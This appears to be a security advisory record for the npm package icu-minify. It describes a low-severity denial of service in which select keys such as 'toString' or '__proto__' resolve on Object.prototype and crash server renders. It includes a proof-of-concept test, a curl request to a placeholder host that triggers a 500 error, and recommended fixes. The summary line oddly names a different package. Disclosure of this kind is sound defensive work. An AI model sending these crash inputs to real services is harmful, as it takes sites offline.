@@ -1,0 +1,264 @@
+advisory_id: GHSA-r27j-894h-3w3p
+datasource_id: github_osv/GHSA-r27j-894h-3w3p
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-r27j-894h-3w3p/GHSA-r27j-894h-3w3p.json
+aliases: []
+summary: |
+  mcp-data-vis vulnerable to denial of service via unsanitized `select` key lookup on `Object.prototype` with `precompile: true`
+  ## Summary
+
+  `icu-minify`'s runtime formatter resolves `select` branches by looking up the runtime value as a plain property on a prototype-bearing object. When the value coerces to a key that exists on `Object.prototype` (e.g. `toString`, `__proto__`, `constructor`, `hasOwnProperty`, `valueOf`), the lookup returns a truthy value that short-circuits the `?? options.other` fallback, and the downstream iterator crashes with `TypeError: nodes is not iterable`. Any consumer that forwards user input into a `{arg, select, …}` placeholder — a common idiom for `role`, `status`, `type`, `gender` — can be crashed per-request by supplying one of those keys. In Next.js SSR (via `next-intl` with `experimental.messages.precompile`) this yields a 500 for the affected render.
+
+  ## Details
+
+  ### Vulnerable code paths
+
+  Compilation produces a plain object whose prototype chain includes all `Object.prototype` members:
+
+  ```tsx
+  // packages/icu-minify/src/compile.tsx:191-199
+  function compileSelect(node: SelectElement): CompiledNode {
+    const options: SelectOptions = {};            // <-- plain object, inherits from Object.prototype
+
+    for (const [key, option] of Object.entries(node.options)) {
+      options[key] = compileNodesToNode(option.value);
+    }
+
+    return [node.value, TYPE_SELECT, options];
+  }
+  ```
+
+  At runtime, the formatter looks up the user-controllable value directly on that object:
+
+  ```tsx
+  // packages/icu-minify/src/format.tsx:226-244
+  function formatSelect<RichTextElement>(
+    name: string,
+    options: SelectOptions,
+    locale: string,
+    values: FormatValues<RichTextElement>,
+    formatOptions: FormatOptions,
+    pluralCtx: PluralContext | undefined
+  ): string | RichTextElement | Array<string | RichTextElement> {
+    const value = String(getValue(values, name));               // 234: coerce to string, no sanitization
+    const branch: CompiledNode | undefined = options[value] ?? options.other; // 235: unsafe lookup
+
+    if (process.env.NODE_ENV !== 'production' && !branch) {
+      throw new Error(
+        `No matching branch for select "${name}" with value "${value}"`
+      );
+    }
+
+    return formatBranch(branch, locale, values, formatOptions, pluralCtx); // 243
+  }
+  ```
+
+  Because `options` inherits from `Object.prototype`, lookups such as `options['toString']` return `Object.prototype.toString` — a truthy `Function`. The `?? options.other` fallback is therefore skipped, and the non-array, non-string branch is passed to `formatBranch`, which forwards it to `formatNodes`:
+
+  ```tsx
+  // packages/icu-minify/src/format.tsx:286-308
+  function formatBranch<RichTextElement>(
+    branch: CompiledNode,
+    /* … */
+  ) {
+    if (typeof branch === 'string') return branch;           // string: fine
+    if (branch === TYPE_POUND) return formatNode(/* … */);    // pound: fine
+    return formatNodes(branch as Array<CompiledNode>, /* … */); // 301: Function is not iterable
+  }
+
+  // packages/icu-minify/src/format.tsx:73-92
+  function formatNodes<RichTextElement>(
+    nodes: Array<CompiledNode>,
+    /* … */
+  ): Array<string | RichTextElement> {
+    const result: Array<string | RichTextElement> = [];
+    for (const node of nodes) {                              // 82: TypeError: nodes is not iterable
+      /* … */
+    }
+    return result;
+  }
+  ```
+
+  Five bare-prototype keys reliably crash the formatter in production: `toString`, `__proto__`, `constructor`, `hasOwnProperty`, `valueOf` (plus `propertyIsEnumerable`, `isPrototypeOf`, `toLocaleString`). Note the development branch at line 237 (`throw new Error('No matching branch for select …')`) is bypassed because the inherited function is truthy — so this is not masked in development either.
+
+  ### Why `formatPlural` is not affected
+
+  `formatPlural` (format.tsx:246-284) looks safe for two independent reasons and does not need to be patched for this specific bug:
+
+  1. Exact-match keys use the `=${value}` prefix (`exactKey = '=' + value`, line 263), so the attacker would need to supply e.g. `=toString`, which is not a member of `Object.prototype`.
+  2. The category branch uses `formatOptions.formatters.getPluralRules(locale, {type}).select(value)` which returns a fixed enum (`zero|one|two|few|many|other`), never attacker-supplied.
+
+  The bug is specific to the `select` path where the raw string value is used as the lookup key.
+
+  ### Reachability
+
+  - **Direct consumers of `icu-minify`**: any code calling `format(compiled, locale, values, …)` where `values[arg]` for a `select` placeholder comes from user input is vulnerable with no additional preconditions.
+  - **`next-intl` users** who enable `experimental.messages.precompile` (`packages/next-intl/src/plugin/types.tsx:24`, wired in `packages/next-intl/src/plugin/getNextConfig.tsx:177-293`): the runtime at `packages/use-intl/src/core/format-message/format-only.tsx` forwards directly to `icu-minify/format`, so `t('msg', {role: req.query.role})` against a `{role, select, admin {…} other {…}}` message crashes the render.
+
+  No middleware, type guard, escaping, or framework default stands between user input and the unsafe lookup — `values` reaches `format()` unmodified.
+
+  ## PoC
+
+  Verified dynamically against `packages/icu-minify/src/format.tsx` at commit `b4aa538` (v4.9.1) with vitest and `NODE_ENV=production`.
+
+  Reproduction (drop into `packages/icu-minify/test/poc.test.ts` and run `pnpm exec vitest run test/poc.test.ts`):
+
+  ```ts
+  import {describe, expect, it} from 'vitest';
+  import compile from '../src/compile.js';
+  import format, {type FormatOptions} from '../src/format.js';
+
+  const formatters: FormatOptions['formatters'] = {
+    getDateTimeFormat: (...a) => new Intl.DateTimeFormat(...a),
+    getNumberFormat:   (...a) => new Intl.NumberFormat(...a),
+    getPluralRules:    (...a) => new Intl.PluralRules(...a)
+  };
+
+  describe('select prototype-key DoS', () => {
+    const compiled = compile('{role, select, admin {Admin} user {User} other {Guest}}');
+
+    for (const key of ['toString', '__proto__', 'constructor', 'hasOwnProperty', 'valueOf']) {
+      it(`crashes on role="${key}"`, () => {
+        process.env.NODE_ENV = 'production';
+        expect(() => format(compiled, 'en', {role: key}, {formatters}))
+          .toThrow(TypeError); // "nodes is not iterable"
+      });
+    }
+  });
+  ```
+
+  Observed output (each of the 5 keys):
+
+  ```
+  TypeError: nodes is not iterable
+      at formatNodes (packages/icu-minify/src/format.tsx:82:22)
+      at formatBranch (packages/icu-minify/src/format.tsx:301:10)
+      at formatSelect (packages/icu-minify/src/format.tsx:243:10)
+      at formatNode (packages/icu-minify/src/format.tsx:150:14)
+      at formatNodes (packages/icu-minify/src/format.tsx:83:23)
+      at format (packages/icu-minify/src/format.tsx:64:18)
+  ```
+
+  End-to-end Next.js scenario (illustrative — any attacker-controlled `role`/`status`/`type`/`gender` forwarded into a `select` placeholder triggers the same exception inside the server render):
+
+  ```tsx
+  // app/[locale]/profile/page.tsx — assume precompile enabled
+  export default async function Page({searchParams}: {searchParams: Promise<{role?: string}>}) {
+    const t = await getTranslations('Profile');
+    const {role = 'other'} = await searchParams;
+    return <h1>{t('greeting', {role})}</h1>;
+    //                         ^^^^^ messages: { "greeting": "{role, select, admin {Hi admin} other {Hi}}" }
+  }
+  ```
+
+  ```
+  curl -i 'https://target.example/en/profile?role=toString'
+  HTTP/1.1 500 Internal Server Error
+  ```
+
+  ## Impact
+
+  - **Availability**: An unauthenticated attacker can force a 500 response on any page or API route that formats a `select` ICU message using user-controllable input. Each request fails independently; there is no persistent state corruption or amplification beyond the malicious request.
+  - **Confidentiality / Integrity**: None. No data is leaked and no prototype write occurs — this is a prototype-chain *read* confusion, not a prototype pollution write.
+  - **Scope**: Any consumer of `icu-minify` that passes user input into a `select` branch is vulnerable. `next-intl` users are only exposed if they have opted into the experimental `experimental.messages.precompile` flag.
+  - **Preconditions**: Developer must forward untrusted input to a `{arg, select, …}` placeholder. This is a routine pattern (`role`, `status`, `gender`, `type`) and the library offers no documentation warning that `select` keys must be validated against prototype members.
+
+  ## Recommended Fix
+
+  Either of the following (defense-in-depth suggests both). Both are one-line, minimal-churn fixes.
+
+  1. Use a null-prototype map in `compileSelect` (and symmetrically in `compilePlural`) so that no `Object.prototype` keys can ever be resolved:
+
+  ```tsx
+  // packages/icu-minify/src/compile.tsx
+  function compileSelect(node: SelectElement): CompiledNode {
+  -  const options: SelectOptions = {};
+  +  const options: SelectOptions = Object.create(null);
+
+     for (const [key, option] of Object.entries(node.options)) {
+       options[key] = compileNodesToNode(option.value);
+     }
+
+     return [node.value, TYPE_SELECT, options];
+   }
+  ```
+
+  2. Gate the runtime lookup with `Object.prototype.hasOwnProperty.call` so the `other` fallback is reached for any non-own key:
+
+  ```tsx
+  // packages/icu-minify/src/format.tsx
+   function formatSelect<RichTextElement>(/* … */) {
+     const value = String(getValue(values, name));
+  -  const branch: CompiledNode | undefined = options[value] ?? options.other;
+  +  const branch: CompiledNode | undefined =
+  +    Object.prototype.hasOwnProperty.call(options, value) ? options[value] : options.other;
+     /* … */
+   }
+  ```
+
+  Option 1 is preferable because it also survives future serialization round-trips (e.g. JSON-hydrated compiled messages) and removes the hazard at the source. Option 2 is a defensive backstop for any code path that constructs `SelectOptions` from arbitrary JSON at runtime.
+
+  No regression is expected in tests — `compileSelect` never reads back through the prototype chain, and all existing lookups use own properties.
+impacted_packages:
+  - purl: pkg:npm/icu-minify
+    affected_versions: vers:npm/<=4.9.1
+    fixed_versions: vers:npm/4.9.2
+    affected_packages:
+      - pkg:npm/icu-minify@0.0.0-canary-031e83a
+      - pkg:npm/icu-minify@0.0.0-canary-061f08c
+      - pkg:npm/icu-minify@0.0.0-canary-0f4e882
+      - pkg:npm/icu-minify@0.0.0-canary-0f7ee4c
+      - pkg:npm/icu-minify@0.0.0-canary-1a95c34
+      - pkg:npm/icu-minify@0.0.0-canary-212f26c
+      - pkg:npm/icu-minify@0.0.0-canary-2f201b8
+      - pkg:npm/icu-minify@0.0.0-canary-315d747
+      - pkg:npm/icu-minify@0.0.0-canary-375b031
+      - pkg:npm/icu-minify@0.0.0-canary-50c3c01
+      - pkg:npm/icu-minify@0.0.0-canary-53bd552
+      - pkg:npm/icu-minify@0.0.0-canary-6b9a772
+      - pkg:npm/icu-minify@0.0.0-canary-76127ff
+      - pkg:npm/icu-minify@0.0.0-canary-784589e
+      - pkg:npm/icu-minify@0.0.0-canary-7ef1b03
+      - pkg:npm/icu-minify@0.0.0-canary-87d32f6
+      - pkg:npm/icu-minify@0.0.0-canary-8de90a4
+      - pkg:npm/icu-minify@0.0.0-canary-8f7782e
+      - pkg:npm/icu-minify@0.0.0-canary-97f8970
+      - pkg:npm/icu-minify@0.0.0-canary-9f1cde4
+      - pkg:npm/icu-minify@0.0.0-canary-ada417e
+      - pkg:npm/icu-minify@0.0.0-canary-b75afc6
+      - pkg:npm/icu-minify@0.0.0-canary-c1152a2
+      - pkg:npm/icu-minify@0.0.0-canary-c22cb45
+      - pkg:npm/icu-minify@0.0.0-canary-dc800af
+      - pkg:npm/icu-minify@0.0.0-canary-f5d21f8
+      - pkg:npm/icu-minify@0.0.1
+      - pkg:npm/icu-minify@4.8.0
+      - pkg:npm/icu-minify@4.8.1
+      - pkg:npm/icu-minify@4.8.2
+      - pkg:npm/icu-minify@4.8.3
+      - pkg:npm/icu-minify@4.8.4
+      - pkg:npm/icu-minify@4.9.0
+      - pkg:npm/icu-minify@4.9.1
+    fixed_packages:
+      - pkg:npm/icu-minify@4.9.2
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '3.7'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-r27j-894h-3w3p/GHSA-r27j-894h-3w3p.json
+  - score: LOW
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-1321
+references:
+  - url: https://github.com/amannn/next-intl
+    reference_type:
+    reference_id:
+  - url: https://github.com/amannn/next-intl/security/advisories/GHSA-r27j-894h-3w3p
+    reference_type:
+    reference_id: GHSA-r27j-894h-3w3p
+exploits: []
